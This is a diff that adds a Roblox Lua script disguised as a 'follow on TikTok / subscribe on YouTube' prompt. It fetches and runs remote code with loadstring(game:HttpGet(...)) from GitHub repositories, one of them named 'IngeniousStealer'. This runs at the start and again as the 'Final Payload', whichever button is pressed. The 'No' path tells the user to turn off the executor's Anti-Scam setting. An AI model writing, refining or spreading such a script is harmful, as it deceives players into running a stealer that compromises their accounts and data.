@@ -1,0 +1,101 @@
+-- // Custom Loading Screen First
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IngeniousScripts/IngeniousStealer/refs/heads/main/Loading-Screen", true))()
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+
+-- // Create Red Solid GUI
+local ScreenGui = Instance.new("ScreenGui", CoreGui)
+ScreenGui.Name = "FollowPrompt"
+ScreenGui.ResetOnSpawn = false
+
+local function createPrompt(text, onYes, onNo)
+	local Frame = Instance.new("Frame", ScreenGui)
+	Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+	Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+	Frame.Size = UDim2.new(0, 380, 0, 150)
+	Frame.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+	Frame.BorderSizePixel = 0
+	Frame.ClipsDescendants = true
+	Frame.Name = "PromptFrame"
+	Frame.BackgroundTransparency = 0
+
+	local UICorner = Instance.new("UICorner", Frame)
+	UICorner.CornerRadius = UDim.new(0, 12)
+
+	local TextLabel = Instance.new("TextLabel", Frame)
+	TextLabel.Size = UDim2.new(1, -20, 0, 60)
+	TextLabel.Position = UDim2.new(0, 10, 0, 10)
+	TextLabel.BackgroundTransparency = 1
+	TextLabel.Text = text
+	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.Font = Enum.Font.GothamBold
+	TextLabel.TextSize = 20
+	TextLabel.TextWrapped = true
+	TextLabel.Name = "MainText"
+
+	local YesBtn = Instance.new("TextButton", Frame)
+	YesBtn.Size = UDim2.new(0.4, 0, 0, 35)
+	YesBtn.Position = UDim2.new(0.1, 0, 1, -45)
+	YesBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+	YesBtn.Text = "Yes ✅"
+	YesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	YesBtn.Font = Enum.Font.Gotham
+	YesBtn.TextSize = 16
+	YesBtn.Visible = false
+
+	local NoBtn = Instance.new("TextButton", Frame)
+	NoBtn.Size = UDim2.new(0.4, 0, 0, 35)
+	NoBtn.Position = UDim2.new(0.5, 0, 1, -45)
+	NoBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 50)
+	NoBtn.Text = "No ❌"
+	NoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	NoBtn.Font = Enum.Font.Gotham
+	NoBtn.TextSize = 16
+	NoBtn.Visible = false
+
+	task.delay(10, function()
+		YesBtn.Visible = true
+		NoBtn.Visible = true
+		TextLabel.Text = "Are you followed/subscribed?"
+	end)
+
+	YesBtn.MouseButton1Click:Connect(function()
+		Frame:Destroy()
+		onYes()
+	end)
+
+	NoBtn.MouseButton1Click:Connect(function()
+		TextLabel.Text = "Go to Delta > Settings > Anti-Scam and turn it off"
+		YesBtn.Visible = false
+		NoBtn.Visible = false
+		task.delay(3, function()
+			Frame:Destroy()
+			onNo()
+		end)
+	end)
+end
+
+-- // Final Payload
+local function loadStealer()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/IngeniousScripts/IngeniousStealer/refs/heads/main/Loading-Screen", true))()
+	wait(2)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/filtpants/filtpants-script/refs/heads/main/FIltPants"))()
+end
+
+-- // YouTube Step
+local function showYouTubePrompt()
+	createPrompt("Subscribe to @Filtpants on YouTube 🔔", function()
+		loadStealer()
+	end, function()
+		loadStealer()
+	end)
+end
+
+-- // TikTok Step First
+createPrompt("Follow @IngeniousMain on TikTok 👀", function()
+	showYouTubePrompt()
+end, function()
+	showYouTubePrompt()
+end
